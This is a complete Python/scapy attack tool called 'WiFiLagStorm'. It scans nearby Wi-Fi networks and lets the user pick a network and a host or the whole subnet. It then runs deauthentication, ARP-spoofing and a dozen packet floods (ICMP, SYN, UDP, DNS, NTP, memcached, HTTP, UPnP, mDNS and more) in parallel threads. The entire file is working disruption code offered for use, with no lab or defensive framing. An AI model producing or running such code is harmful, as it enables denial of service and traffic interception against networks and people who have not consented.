#!/usr/bin/env python3
"""
WiFiLagStorm – Scans all visible SSIDs, lets user pick one,
then floods the strongest AP with that SSID using all attacks.
"""

import sys
import time
import threading
import random
import socket
import struct
import os
import subprocess
import re
from scapy.all import (
    RadioTap, Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt,
    ARP, Ether,
    IP, ICMP, UDP, TCP, Raw,
    sendp, send, sniff, conf
)

# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------
def iface_exists(iface):
    return os.path.exists(f"/sys/class/net/{iface}")

def get_base_wireless_ifaces():
    ifaces = os.listdir("/sys/class/net")
    base = []
    for iface in ifaces:
        if not os.path.exists(f"/sys/class/net/{iface}/wireless"):
            continue
        if iface.endswith("mon"):
            continue
        try:
            out = subprocess.check_output(["iw", iface, "info"], stderr=subprocess.DEVNULL).decode()
            if "type monitor" in out:
                continue
        except Exception:
            pass
        base.append(iface)
    return sorted(set(base))

def create_monitor_iface(phy_iface):
    mon_name = f"{phy_iface}mon"
    if iface_exists(mon_name):
        return mon_name
    try:
        subprocess.run(["iw", phy_iface, "interface", "add", mon_name, "type", "monitor"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if iface_exists(mon_name):
            return mon_name
    except Exception:
        pass
    try:
        subprocess.run(["airmon-ng", "start", phy_iface], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if iface_exists(mon_name):
            return mon_name
    except Exception:
        pass
    return None

def set_monitor_up(iface):
    try:
        subprocess.run(["ip", "link", "set", iface, "up"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", iface, "set", "channel", "6"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
    except Exception:
        return ""

# ----------------------------------------------------------------------
# WiFi scanning
# ----------------------------------------------------------------------
def scan_aps_scapy(iface_mon, timeout=10):
    if not iface_exists(iface_mon):
        return []
    print(f"[*] Scanning WiFi networks on {iface_mon} for {timeout} seconds...")
    aps = {}
    def handle_pkt(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if bssid not in aps:
                ssid = ""
                channel = None
                rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 0:
                        ssid = elt.info.decode(errors="ignore")
                    elif elt.ID == 3:
                        channel = ord(elt.info[0:1])
                    elt = elt.payload if hasattr(elt, "payload") else None
                if ssid:
                    aps[bssid] = {'ssid': ssid, 'bssid': bssid, 'channel': channel, 'rssi': rssi}
    try:
        sniff(iface=iface_mon, prn=handle_pkt, timeout=timeout, store=False)
    except Exception as e:
        print(f"[!] Scapy sniff error: {e}")
    return list(aps.values())

def scan_aps_iw(iface_man):
    print(f"[*] Fallback: iw scan on {iface_man}...")
    try:
        subprocess.run(["ip", "link", "set", iface_man, "up"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        out = subprocess.check_output(["iw", "dev", iface_man, "scan"], timeout=15, stderr=subprocess.DEVNULL).decode()
    except Exception as e:
        print(f"[!] iw scan failed: {e}")
        return []
    aps = []
    current_bss = None
    current_ssid = ""
    for line in out.splitlines():
        if "BSS " in line and "(on" in line:
            if current_bss and current_ssid:
                aps.append({'ssid': current_ssid, 'bssid': current_bss, 'channel': None, 'rssi': None})
            parts = line.split()
            current_bss = parts[1].split("(")[0] if len(parts) > 1 else None
            current_ssid = ""
        elif "SSID:" in line:
            current_ssid = line.split("SSID:")[1].strip()
    if current_bss and current_ssid:
        aps.append({'ssid': current_ssid, 'bssid': current_bss, 'channel': None, 'rssi': None})
    return aps

def scan_aps_combined(iface_mon, iface_man, timeout=10):
    set_monitor_up(iface_mon)
    aps = scan_aps_scapy(iface_mon, timeout)
    if not aps:
        aps = scan_aps_iw(iface_man)
    return aps

def get_default_gateway(iface):
    out = run_cmd(f"ip route show dev {iface} | grep default")
    if out:
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    return None

def arp_scan_subnet(iface, subnet="192.168.1.0/24", timeout=2):
    """ARP scan returning list of (ip, mac)."""
    print(f"[*] ARP scanning subnet {subnet} on {iface}...")
    live = []
    try:
        from scapy.layers.l2 import arping
        ans, _ = arping(subnet, iface=iface, timeout=timeout, verbose=False)
        for sent, recv in ans:
            live.append((recv.psrc, recv.hwsrc))
    except Exception as e:
        print(f"[!] ARP scan failed: {e}")
    return live

# ----------------------------------------------------------------------
# Attack functions (unchanged)
# ----------------------------------------------------------------------
def deauth_flood(iface, ap_mac, stop_event):
    pkt = RadioTap()/Dot11(type=0,subtype=12,addr1="ff:ff:ff:ff:ff:ff",addr2=ap_mac,addr3=ap_mac)/Dot11Deauth(reason=7)
    sent=0
    while not stop_event.is_set():
        sendp(pkt, iface=iface, verbose=False)
        sent+=1
        time.sleep(0.002)
    return sent

def arp_flood(iface, gw_ip, tgt_ip, tgt_mac, gw_mac, stop_event):
    p1 = Ether(dst=tgt_mac)/ARP(op=2,psrc=gw_ip,pdst=tgt_ip,hwdst=tgt_mac)
    p2 = Ether(dst=gw_mac)/ARP(op=2,psrc=tgt_ip,pdst=gw_ip,hwdst=gw_mac)
    sent=0
    while not stop_event.is_set():
        sendp([p1,p2], iface=iface, verbose=False)
        sent+=2
        time.sleep(0.001)
    return sent

def icmp_flood(ip, stop_event, iface=None):
    pkt = IP(dst=ip)/ICMP()
    sent=0
    while not stop_event.is_set():
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def multicast_flood(ip, stop_event, iface=None):
    mc=["224.0.0.1","224.0.0.251","239.255.255.250","224.0.0.22"]
    sent=0
    while not stop_event.is_set():
        dst = random.choice(mc)
        pkt = IP(src=ip,dst=dst)/UDP(sport=random.randint(1024,65535),dport=random.randint(1024,65535))/Raw(b"X"*64)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def udp_flood(ip, port, stop_event, iface=None, size=512):
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=port)/Raw(b"\x00"*size)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def tcp_syn_flood(ip, port, stop_event, iface=None):
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        seq=random.randint(0,2**32-1)
        pkt=IP(dst=ip)/TCP(sport=s,dport=port,flags='S',seq=seq)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def smb_flood(ip, stop_event, iface=None):
    return tcp_syn_flood(ip, 445, stop_event, iface)

def ntp_flood(ip, stop_event, iface=None):
    payload=b"\x17\x00\x03\x2a"+b"\x00"*12
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=123)/Raw(payload)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def dns_flood(ip, stop_event, iface=None, qname="example.com"):
    tid=random.randint(0,65535)
    dns_query=struct.pack(">H",tid)
    dns_query+=b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for part in qname.encode().split(b"."):
        dns_query+=bytes([len(part)])+part
    dns_query+=b"\x00\x00\x01\x00\x01"
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=53)/Raw(dns_query)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def memcached_flood(ip, stop_event, iface=None):
    payload=b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=11211)/Raw(payload)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def http_flood(ip, port, method, path, stop_event, iface=None, host="example.com"):
    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: LagStorm/1.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode()
    sent=0
    while not stop_event.is_set():
        try:
            sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip,port))
            sock.send(request)
            sock.close()
        except:
            pass
        sent+=1
    return sent

def upnp_flood(ip, stop_event, iface=None):
    payload = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n").encode()
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=1900)/Raw(payload)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def mdns_flood(ip, stop_event, iface=None):
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01"
    sent=0
    while not stop_event.is_set():
        s=random.randint(1024,65535)
        pkt=IP(dst=ip)/UDP(sport=s,dport=5353)/Raw(payload)
        send(pkt, iface=iface, verbose=False) if iface else send(pkt, verbose=False)
        sent+=1
    return sent

def attack_worker(func, args, stop_event, counters, idx):
    try:
        cnt = func(*args, stop_event=stop_event)
        counters[idx] = cnt
    except Exception as e:
        print(f"[!] Thread {idx} error: {e}", file=sys.stderr)
        counters[idx] = 0

# ----------------------------------------------------------------------
# Main – auto SSID list + selection
# ----------------------------------------------------------------------
def main():
    if os.geteuid() != 0:
        sys.exit("[!] Must run as root (sudo).")

    print("WiFiLagStorm – Auto‑Scan SSID Selector")
    print("---------------------------------------")

    base_ifaces = get_base_wireless_ifaces()
    if not base_ifaces:
        sys.exit("[!] No wireless interfaces found.")

    if len(base_ifaces) == 1:
        phy_iface = base_ifaces[0]
        print(f"[*] Using physical interface: {phy_iface}")
    else:
        print("Available wireless interfaces:")
        for i, iface in enumerate(base_ifaces, 1):
            print(f"  {i}: {iface}")
        sel = int(input("Select: ")) - 1
        phy_iface = base_ifaces[sel]

    monitor_iface = f"{phy_iface}mon"
    if not iface_exists(monitor_iface):
        print(f"[*] Creating monitor interface...")
        created = create_monitor_iface(phy_iface)
        if created:
            monitor_iface = created
            print(f"[+] Created {monitor_iface}")
        else:
            print("[!] Failed to create monitor interface.")
            sys.exit(1)
    else:
        print(f"[*] Monitor interface {monitor_iface} exists.")

    managed_iface = phy_iface

    # Scan all APs
    aps = scan_aps_combined(monitor_iface, managed_iface, timeout=10)
    if not aps:
        print("[!] No networks found.")
        sys.exit(1)

    # Build unique SSID list with the strongest AP for each
    ssid_map = {}
    for ap in aps:
        ssid = ap['ssid']
        if ssid not in ssid_map or (ap.get('rssi') or -100) > (ssid_map[ssid].get('rssi') or -100):
            ssid_map[ssid] = ap

    unique_ssids = sorted(ssid_map.keys())
    if not unique_ssids:
        print("[!] No SSIDs found.")
        sys.exit(1)

    print("\nAvailable WiFi networks:")
    for i, ssid in enumerate(unique_ssids, 1):
        ap = ssid_map[ssid]
        rssi_str = f" (RSSI: {ap.get('rssi')} dBm)" if ap.get('rssi') else ""
        print(f"  {i}: {ssid}{rssi_str}")

    while True:
        try:
            sel = int(input("Select network number: "))
            if 1 <= sel <= len(unique_ssids):
                target_ssid = unique_ssids[sel-1]
                ap = ssid_map[target_ssid]
                ap_mac = ap['bssid']
                print(f"[*] Selected {target_ssid} ({ap_mac})")
                break
        except ValueError:
            pass
        print("Invalid choice.")

    # Gateway detection (unchanged)
    gateway = get_default_gateway(managed_iface)
    if not gateway:
        print("[*] No default gateway, scanning subnet...")
        live = arp_scan_subnet(managed_iface, "192.168.1.0/24")
        if live:
            gateway = sorted(live, key=lambda x: tuple(map(int, x[0].split('.'))))[0][0]
        else:
            gateway = input("Enter gateway IP manually (e.g., 192.168.1.1): ").strip()
            if not gateway:
                sys.exit("Gateway required.")
    print(f"[*] Gateway: {gateway}")

    gw_parts = gateway.split('.')
    if len(gw_parts) == 4:
        subnet_24 = f"{gw_parts[0]}.{gw_parts[1]}.{gw_parts[2]}.0/24"
        broadcast_ip = f"{gw_parts[0]}.{gw_parts[1]}.{gw_parts[2]}.255"
    else:
        subnet_24 = "192.168.1.0/24"
        broadcast_ip = "192.168.1.255"

    # ARP scan for target IP selection
    live_hosts = arp_scan_subnet(managed_iface, subnet_24, timeout=3)
    if not live_hosts:
        print("[!] No live hosts found; using broadcast.")
        target_ip = broadcast_ip
        target_mac = "ff:ff:ff:ff:ff:ff"
    else:
        print("\nLive hosts found:")
        for i, (ip, mac) in enumerate(live_hosts, 1):
            print(f"  {i}: {ip}  ({mac})")
        print(f"  0: All devices (broadcast {broadcast_ip})")
        while True:
            choice = input("Select target number: ").strip()
            if choice == "0":
                target_ip = broadcast_ip
                target_mac = "ff:ff:ff:ff:ff:ff"
                break
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(live_hosts):
                    target_ip = live_hosts[idx][0]
                    target_mac = live_hosts[idx][1]
                    break
            except:
                pass
            print("Invalid selection.")

    print(f"[*] Target IP: {target_ip}, MAC: {target_mac}")

    # Threads and duration
    threads = int(input("Threads per attack [4]: ") or 4)
    duration = int(input("Duration in seconds (0=infinite) [0]: ") or 0)

    # All attacks enabled
    attack_funcs = {
        'deauth': (deauth_flood, (monitor_iface, ap_mac)),
        'arp': (arp_flood, (managed_iface, gateway, target_ip, target_mac, ap_mac)),
        'icmp': (icmp_flood, (target_ip,)),
        'multicast': (multicast_flood, (target_ip,)),
        'udp': (udp_flood, (target_ip, 80)),
        'tcp': (tcp_syn_flood, (target_ip, 80)),
        'smb': (smb_flood, (target_ip,)),
        'ntp': (ntp_flood, (target_ip,)),
        'dns': (dns_flood, (target_ip,)),
        'memcached': (memcached_flood, (target_ip,)),
        'http': (http_flood, (target_ip, 80, 'GET', '/')),
        'upnp': (upnp_flood, (target_ip,)),
        'mdns': (mdns_flood, (target_ip,)),
    }

    print(f"\n[*] Launching ALL attacks on {target_ip}...")
    stop_event = threading.Event()
    counters = [0] * (len(attack_funcs) * threads)
    thread_list = []
    idx = 0
    for name, (func, args) in attack_funcs.items():
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, args=(func, args, stop_event, counters, idx))
            t.daemon = True
            thread_list.append(t)
            idx += 1

    start = time.time()
    for t in thread_list:
        t.start()

    try:
        if duration > 0:
            time.sleep(duration)
            stop_event.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Interrupted. Stopping...")
        stop_event.set()

    for t in thread_list:
        t.join()

    total = sum(counters)
    elapsed = time.time() - start
    print(f"[*] Done. Total packets/requests: {total} in {elapsed:.2f}s")

if __name__ == '__main__':
    main()